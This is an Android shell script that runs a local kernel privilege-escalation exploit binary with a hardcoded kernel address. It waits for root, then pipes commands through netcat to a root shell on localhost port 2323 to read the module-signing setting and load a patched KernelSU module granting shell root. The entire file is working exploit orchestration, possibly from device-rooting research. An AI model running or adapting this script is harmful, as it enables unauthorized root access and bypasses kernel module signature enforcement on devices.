#!/system/bin/sh
# One-shot: exploit -> wait for root -> drive the helper socket directly so the
# sig_enforce read and the insmod attempt both happen inside the root window.
LOG=/data/local/tmp/glk-run.log
VER=/data/local/tmp/verify.log
rm -f "$LOG" "$VER"
echo "uptime_before=$(cut -d' ' -f1 /proc/uptime)" > "$VER"

GLK_ZERO_ADDR=0xffffffc0830c7708 setsid /data/local/tmp/glk-bin3 \
    --load-prebuilt-profile /data/local/tmp/profile_175.bin > "$LOG" 2>&1 &

for i in $(seq 1 40); do
    sleep 2
    grep -qa "child is root" "$LOG" && break
done
echo "reached_root_at=$((i*2))s" >> "$VER"
sleep 3

{
    echo "--- root shell probe ---"
    echo "cat /sys/module/module/parameters/sig_enforce"
    echo "echo SIG_DONE"
    echo "/data/local/tmp/ksud insmod /data/local/tmp/kernelsu-patched.ko allow_shell=1"
    echo "echo INSMOD_RC=\$?"
    echo "grep -i ksu /proc/modules || echo NO_KSU_MODULE"
    echo "echo ALL_DONE"
} | nc 127.0.0.1 2323 >> "$VER" 2>&1

echo "--- after ---" >> "$VER"
grep -i ksu /proc/modules >> "$VER" 2>&1
echo "GLK_STEP2_DONE" >> "$VER"
